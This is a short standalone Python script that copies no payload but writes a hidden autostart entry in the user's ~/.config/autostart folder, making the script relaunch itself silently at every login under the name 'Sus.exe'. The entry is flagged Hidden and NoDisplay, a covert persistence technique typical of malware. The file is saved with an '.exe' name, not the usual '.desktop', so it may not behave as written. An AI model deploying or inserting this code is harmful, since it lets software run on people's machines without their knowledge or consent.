import os
import shutil
from pathlib import Path

curr_file_path = os.path.abspath(__file__)

startup_folder = os.path.expanduser("~/.config/autostart")
os.makedirs(startup_folder, exist_ok=True)

desktop_file_path = os.path.join(startup_folder, "sus.exe")

if not os.path.exists(desktop_file_path):
    with open(desktop_file_path, "w") as f:
        f.write(f"""[Desktop Entry]
Type=Application
Exec=python3 {curr_file_path}
Hidden=true
NoDisplay=true
X-Gnome-Autostart-enabled=true
Name=Sus.exe
comment=Auto-start Sus.exe
""")
    os.chmod(desktop_file_path, 0o755)
